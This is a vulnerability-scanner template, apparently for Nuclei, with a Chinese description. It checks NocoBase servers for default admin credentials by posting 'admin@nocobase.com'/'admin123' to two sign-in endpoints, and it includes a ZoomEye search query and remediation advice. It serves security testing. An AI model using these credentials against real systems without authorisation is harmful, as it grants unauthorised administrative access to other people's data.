id: nocobase-default-credential-login

info:
  name: NocoBase 默认凭据登录漏洞
  author: Fur1na, icarot
  severity: high
  description: |
    检测到 NocoBase 系统存在默认登录凭据，攻击者可借此直接获取系统访问权限。
  reference:
    - https://www.nocobase.com/
    - https://github.com/nocobase/nocobase
    - https://docs.nocobase.com/welcome/getting-started/installation/docker-compose
  metadata:
    verified: true
    max-request: 2
    zoomeye-query: app="NocoBase"
  tags: NocoBase
  remediation: >-
    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。

variables:
  username: "admin@nocobase.com"
  password: "admin123"

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"account": "{{username}}", "password": "{{password}}"}
    payloads:
      path:
        - '/api/auth:signIn'
        - '/api/v1/auth/user/signin'
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"username":'
          - '"email":'
          - 'systemSettings'
        condition: and
      - type: word
        part: content_type
        words:
          - "application/json"
      - type: status
        status:
          - 200
